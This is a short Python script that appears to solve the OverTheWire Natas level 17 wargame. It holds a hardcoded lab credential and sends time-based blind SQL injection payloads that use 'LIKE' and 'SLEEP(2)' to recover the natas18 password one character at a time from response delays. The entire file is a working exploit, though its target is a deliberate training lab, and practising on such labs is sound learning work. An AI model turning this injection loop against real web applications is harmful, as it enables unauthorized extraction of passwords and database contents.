#!/user/bin/env python
import requests
import re
import base64
import urllib
from string import *
from time import *

characters = ascii_lowercase + ascii_uppercase + digits

username = 'natas17'
password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'

url = 'http://%s.natas.labs.overthewire.org/?debug=true' % username
session = requests.Session()

session = requests.session()
seen_password = list()

while len(seen_password) < 32:
    for character in characters:
        start_time = time()
        # print("start_time", start_time)
        print("Trying ", "".join(seen_password) + character)
        response = session.post(url,
                                data={"username": 'natas18" AND password LIKE "' + "".join(seen_password) + character + '%" AND SLEEP(2)# '},
                                auth=(username, password))
        content = response.text
        end_time = time()
        difference = end_time - start_time

        if difference > 1:
            seen_password.append(character)
            break
        #print("....end time", end_time, "and difference :", difference)
        # print(content)

print("".join(seen_password))
